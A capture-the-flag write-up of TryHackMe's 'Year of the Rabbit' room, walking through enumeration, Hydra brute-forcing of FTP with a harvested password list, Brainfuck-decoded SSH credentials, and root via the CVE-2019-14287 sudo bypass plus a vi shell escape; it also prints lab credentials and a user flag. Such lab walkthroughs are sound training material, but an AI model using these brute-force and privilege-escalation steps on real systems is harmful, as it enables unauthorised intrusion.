# 🐇 TryHackMe - Year of the Rabbit Write-Up

A complete walkthrough of the **Year of the Rabbit** room on TryHackMe, demonstrating how web enumeration, steganography, 
credential discovery, lateral movement, and a vulnerable sudo configuration can lead to full system compromise.

---

# 📋 Room Information

| Category | Details |
|-----------|----------|
| Room | Year of the Rabbit |
| Platform | TryHackMe |
| Difficulty | Easy |
| Target OS | Linux (Debian) |

---

# 🎯 Objective

Gain initial access to the target machine, enumerate the system, obtain user credentials, move laterally between user accounts,
and escalate privileges to obtain root access.

---

# 🛠️ Skills Demonstrated

- Network Enumeration
- Web Directory Fuzzing
- Source Code Analysis
- Steganography Discovery
- Brainfuck Decoding
- SSH Authentication
- Linux Enumeration
- Credential Harvesting
- Privilege Escalation
- Sudo Misconfiguration Exploitation


---

# 🔗 Attack Path Overview

```text
Nmap Enumeration
        ↓
Web Directory Discovery
        ↓
Hidden Developer Hint
        ↓
Image Metadata Analysis
        ↓
Brainfuck Payload Extraction
        ↓
Credential Discovery
        ↓
SSH Access (eli)
        ↓
Password Disclosure
        ↓
Lateral Movement (gwendoline)
        ↓
Sudo Misconfiguration
        ↓
CVE-2019-14287 Exploitation
        ↓
Root Access
```

---

# 🔍 Step 1 - Network Enumeration

As with any penetration test, the first step is identifying exposed services running on the target.

## Nmap Scan

```bash
nmap -sV -sC -O <target-ip> -oN nmap.txt
```

### Scan Results

| Port | Service | Version |
|--------|---------|----------|
| 21 | FTP | vsftpd 3.0.2 |
| 22 | SSH | OpenSSH 6.7p1 Debian 5 |
| 80 | HTTP | Apache httpd 2.4.10 |

### Analysis

The FTP and SSH services did not immediately expose any obvious unauthenticated vulnerabilities. 
The Apache web server on port 80 became the primary attack surface for obtaining initial access.

---

# 🌐 Step 2 - Web Enumeration

Browsing to the web server revealed only the default Apache landing page.

## Directory Fuzzing

To discover hidden content, directory enumeration was performed using **gobuster**.

```bash
gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt
```

### Discovery

```text
/assets/
```

The discovered directory contained several static files, including:

```text
RickRolled.mp4
```

---

# 📝 Step 3 - Source Code Inspection

Inspecting the webpage source code revealed a hidden developer comment:

```html
<!--
Love it when people block Javascript...
This is happening whether you like it or not...
The hint is in the video.
If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
-->
```

This indicated that important information was hidden somewhere within the media assets hosted on the web server.

---


# 🕵️ Step 4 - Burp Suite Interception and Hidden Functionality Discovery

Since the visible content did not provide a clear attack path, I configured **Burp Suite** as an intercepting proxy and monitored the 
application's HTTP traffic.

While browsing the site and analyzing requests, an interesting endpoint appeared in the file /assests/style.css:

```text
/sup3r_s3cr3t_fl4g.php
```
 used Burp Suite to intercept and forward the request to /sup3r_s3cr3t_fl4g.php. After forwarding, Burp showed an additional request that 
 referenced a hidden directory.


```text
/WExYY2Cv-qU
```

This hidden page had not been identified during directory fuzzing.

I found a PNG file named Hot_Babe.png. I tried to extract hidden data with steghide, but that failed, so I used strings on the image. 
The output revealed an FTP username ftpuser and a list of potential passwords.



Navigating directly to the endpoint revealed content containing a username and multiple potential passwords.

## Credentials Discovered

```text
Username: ftpuser
```

The page also contained several password candidates disguised within the content.

To automate testing these passwords against the FTP service, I copied them into a local wordlist.

```bash
 nano ftp_pass.txt
```
```bash
 cat ftp_pass.txt             
Mou+56n%QK8sr
1618B0AUshw1M
A56IpIl%1s02u
vTFbDzX9&Nmu?
FfF~sfu^UQZmT
8FF?iKO27b~V0
ua4W~2-@y7dE$
3j39aMQQ7xFXT
Wb4--CTc4ww*-
u6oY9?nHv84D&
0iBp4W69Gr_Yf
TS*%miyPsGV54
C77O3FIy0c0sd
O14xEhgg0Hxz1
5dpv#Pr$wqH7F
1G8Ucoce1+gS5
0plnI%f0~Jw71
0kLoLzfhqq8u&
kS9pn5yiFGj6d
zeff4#!b5Ib_n
rNT4E4SHDGBkl
KKH5zy23+S0@B
3r6PHtM4NzJjE
gm0!!EC1A0I2?
HPHr!j00RaDEi
7N+J9BYSp4uaY
PYKt-ebvtmWoC
3TN%cD_E6zm*s
eo?@c!ly3&=0Z
nR8&FXz$ZPelN
eE4Mu53UkKHx#
86?004F9!o49d
SNGY0JjA5@0EE
trm64++JZ7R6E
3zJuGL~8KmiK^
CR-ItthsH%9du
yP9kft386bB8G
A-*eE3L@!4W5o
GoM^$82l&GA5D
1t$4$g$I+V_BH
0XxpTd90Vt8OL
j0CN?Z#8Bp69_
G#h~9@5E5QA5l
DRWNM7auXF7@j
Fw!if_=kk7Oqz
92d5r$uyw!vaE
c-AA7a2u!W2*?
zy8z3kBi#2e36
J5%2Hn+7I6QLt
gL$2fmgnq8vI*
Etb?i?Kj4R=QM
7CabD7kwY7=ri
4uaIRX~-cY6K4
kY1oxscv4EB2d
k32?3^x1ex7#o
ep4IPQ_=ku@V8
tQxFJ909rd1y2
5L6kpPR5E2Msn
65NX66Wv~oFP2
LRAQ@zcBphn!1
V4bt3*58Z32Xe
ki^t!+uqB?DyI
5iez1wGXKfPKQ
nJ90XzX&AnF5v
7EiMd5!r%=18c
wYyx6Eq-T^9#@
yT2o$2exo~UdW
ZuI-8!JyI6iRS
PTKM6RsLWZ1&^
3O$oC~%XUlRO@
KW3fjzWpUGHSW
nTzl5f=9eS&*W
WS9x0ZF=x1%8z
Sr4*E4NT5fOhS
hLR3xQV*gHYuC
4P3QgF5kflszS
NIZ2D%d58*v@R
0rJ7p%6Axm05K
94rU30Zx45z5c
Vi^Qf+u%0*q_S
1Fvdp&bNl3#&l
zLH%Ot0Bw&c%9
             
```

The password list was saved for brute-force testing.

---

# 🚀 Step 5 - Brute Forcing FTP Credentials

With a valid username and a custom password list, Hydra was used to perform a targeted brute-force attack against the FTP service.

```bash
hydra -l ftpuser -P ftp_pass.txt ftp://<target-ip>
```

After testing the candidate passwords, Hydra successfully recovered valid credentials.

## Results

```text

login: ftpuser
password: 5iez1wGXKfPKQ
```

## Valid FTP Credentials

```text
Username: ftpuser
Password: 5iez1wGXKfPKQ
```

These credentials provided access to the FTP server.

---

# 📂 Step 6 - FTP Enumeration

Using the recovered credentials, I authenticated to the FTP service.

```bash
ftp <target-ip>
```

```text
Connected to <target-ip>.
220 (vsFTPd 3.0.2)
Name (<target-ip>:kali): ftpuser
331 Please specify the password.
Password:
230 Login successful.
```

After logging in, I enumerated the available files.

```bash
ls
```

## Results

```text
Eli's_Creds.txt
```

The filename strongly suggested that it contained credentials related to another user account.

---

# 📥 Step 7 - Retrieving Eli's_Creds.txt

The file was downloaded for local analysis.

```bash
get Eli's_Creds.txt
```



After opening the file, its contents appeared to be encoded.

```text
+++++ ++++[->+++ ++++++<]>++++.
...
```

The character pattern immediately stood out as Brainfuck code.

---

# 🧠 Step 8 - Decoding Brainfuck

Brainfuck is an esoteric programming language commonly used in CTF challenges to hide information.

The contents of `Eli's_Creds.txt` were copied into an online Brainfuck interpreter.

After decoding the payload, plaintext credentials were revealed.

## Decoded Credentials

```text
Username: eli
Password: DSpDiMlwAEwid
```

These credentials appeared to be valid SSH credentials.

---

# 🔐 Step 9 - Initial Access via SSH

Using the recovered credentials, I connected to the SSH service.

```bash
ssh eli@<target-ip>
```

Password:

```text
DSpDiMlwAEwid
```

Authentication succeeded.

```bash
whoami
```

Output:

```text
eli
```

Initial access to the system had been obtained.

---

# 🔍 Step 10 - Local Enumeration

After obtaining a shell, local enumeration was performed.

Checking sudo privileges revealed no immediate escalation path.

```bash
sudo -l
```

Output:

```text
Sorry, user eli may not run sudo on year-of-the-rabbit.
```

Enumeration identified another user account on the system:

```text
gwendoline
```

Further investigation revealed a message left by root.

```text
Gwendoline, I am not happy with you.
Check our leet s3cr3t hiding place.
I've left you a hidden message there.
```

To locate the referenced file, a filesystem search was performed.

```bash
find / -name "*s3cr3t*" 2>/dev/null
```

---

# 🔑 Step 11 - Discovering Gwendoline's Password

Opening the discovered file revealed the following message.

```text
our password is awful, Gwendoline.

It should be at least 60 characters long!

Not just MniVCQVhQHUNI

Honestly!

Yours sincerely,
Root
```

The highlighted string appeared to be a password.

---

# 🔄 Step 12 - Horizontal Privilege Escalation

The recovered password was used to switch users.

```bash
su gwendoline
```

Password:

```text
MniVCQVhQHUNI
```

Verification:

```bash
whoami
```

Output:

```text
gwendoline
```

The user flag could now be accessed.

```bash
cat /home/gwendoline/user.txt
```

Output:

```text
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

---

# ⬆️ Step 13 - Sudo Enumeration

Checking sudo permissions revealed a highly unusual configuration.

```bash
sudo -l
```

Output:

```text
User gwendoline may run the following commands on year-of-the-rabbit:

(ALL, !root) NOPASSWD:
/usr/bin/vi /home/gwendoline/user.txt
```

At first glance, this appears to prohibit execution as root.

However, the configuration is vulnerable to a known sudo privilege escalation vulnerability.

---

# 💥 Step 14 - Exploiting CVE-2019-14287

The installed sudo version was vulnerable to **CVE-2019-14287**.

This vulnerability allows a user to bypass restrictions preventing execution as root by specifying the user ID:

```text
-1
```

The command below exploits the vulnerability.

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

The editor launches with root privileges.

---

# 🐚 Escaping vi to a Root Shell

Inside vi:

```vim
:!/bin/bash
```

A shell is spawned.

Verification:

```bash
whoami
```

Output:

```text
root
```

Root access was successfully obtained.

---

# 🏁 Step 15 - Root Flag

Navigate to the root directory.

```bash
cd /root
cat root.txt
```

Output:

```text
THM{************************************}
```

---





# ✅ Conclusion

**Year of the Rabbit** is an excellent beginner-to-intermediate room that demonstrates a realistic attack chain from external enumeration to full system compromise.

The compromise path followed:

```text
Nmap Scan
    ↓
Directory Enumeration
    ↓
Burp Suite Discovery
    ↓
Hidden FTP Credentials
    ↓
Hydra Brute Force
    ↓
FTP Access
    ↓
Brainfuck Decoding
    ↓
SSH Access (eli)
    ↓
Password Disclosure
    ↓
Pivot to gwendoline
    ↓
CVE-2019-14287
    ↓
Root Access
```

This room emphasizes the importance of thorough enumeration, careful analysis of hidden functionality, and understanding how small security weaknesses can combine into a complete compromise.
````
